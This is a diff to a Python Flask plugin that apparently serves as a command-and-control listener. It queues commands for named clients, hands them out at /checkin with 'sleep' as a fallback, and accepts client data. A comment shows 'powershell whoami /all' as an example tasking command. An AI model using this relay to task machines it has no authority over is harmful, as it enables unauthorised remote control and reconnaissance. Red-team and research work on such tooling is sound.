@@ -175,8 +175,8 @@ class ExternalPluginClass():
         self.app.route(f'/synccommand', methods = ["POST"])(self.endpoint_get_command)
 
         ## client endpoints
-        self.app.route(f'/command', methods = ["POST"])(self.client_get_command)
-        self.app.route(f'/clientname/checkin', methods = ["POST"])(self.client_post_checkin)
+        #self.app.route(f'/command', methods = ["POST"])(self.client_get_command)
+        self.app.route(f'/checkin', methods = ["POST"])(self.client_post_checkin)
         self.app.route(f'/clientdata', methods = ["POST"])(self.client_post_data)
 
     def get_command_loop(self):
@@ -185,7 +185,7 @@ class ExternalPluginClass():
         ## do stuff with command - build out command tree?
 
     def endpoint_get_command(self):
-        '''
+        ''' POST
         An endpont that gets the JSON from the server for commands for clients
         
         so, server -> posts to this endpoint to update the command queue for clients
@@ -198,28 +198,26 @@ class ExternalPluginClass():
         }
 
         '''
+        #maybe change to ID
+        client_name = request.json.get('id')
+        #timestamp = request.json.get('timestamp')
+        #message = request.json.get('message')
+        command = request.json.get('command')
 
+        client_object = self.get_client(name=client_name)
 
-    def client_get_command(self):
-        '''
-        For clients to get commands - should prolly be a post for the client name & any auth.
+        ## if object does not exist. Kinda hacky
+        if client_object == None:
+            # create object
+            self.logger.debug(f"{self.logger.logging_debug_symbol}: Client object for id: {client_name} did not exist. Creating one")
+            client_object = self.check_in_client(client_name)
 
-        this is where the clients "checkin"
-        
-        '''
-        client_name = "test"
+        client_object.enqueue_command(command=command)
+        print("Queue contents:")
+        client_object.print_queue()
 
-        client_object = self.check_in_client(client_name)
+        return ""
 
-        ## need to figure out formatting here too witht he command
-        command = client_object.dequeue_command()
-
-
-        command = {
-            "command": command#['powershell', 'whoami /all']
-        }
-
-        return jsonify(command)
     
     ## [x] POST works with postman
     def client_post_checkin(self):
@@ -241,6 +239,13 @@ class ExternalPluginClass():
                 #id, message, timestamp)
             self.logger.info(f"{self.logger.logging_info_symbol} ClientCheckin: ID: {id} message: {message} timestamp: {timestamp}")
         
+            ## checkin client
+            self.check_in_client(name=id)
+            ## get command
+            command = self.client_get_command(name=id)
+
+            return command
+
         except Exception as e:
             self.logger.warning(f"{self.logger.logging_warning_symbol} Error with client_post_checkin: {e}")
 
@@ -308,6 +313,30 @@ class ExternalPluginClass():
         #args: Name, what to return if not found
         # .get does not return a keyerror, instead it return whatever you speciy as the 2nd arg
         return self.client_objects.get(name, None)
+    
+    def client_get_command(self,name):
+        ''' 
+        retrieves command from client object queue. Returns command (str)
+        
+        In the event of failure, returns "sleep" command
+        '''
+        try:
+            client_object = self.get_client(name)
+            ## need to figure out formatting here too witht he command
+            command = client_object.dequeue_command()
+
+            command = {
+                "command": command#['powershell', 'whoami /all']
+            }
+
+            return jsonify(command)
+    
+        except Exception as e:
+            self.logger.debug(f"{self.logger.logging_debug_symbol}: Error with client_get_command: {e} ")
+            command = {
+                "command": "sleep"#['powershell', 'whoami /all']
+            }
+            return jsonify(command)
 
 ################################################
 # Some failsafes & subroutines
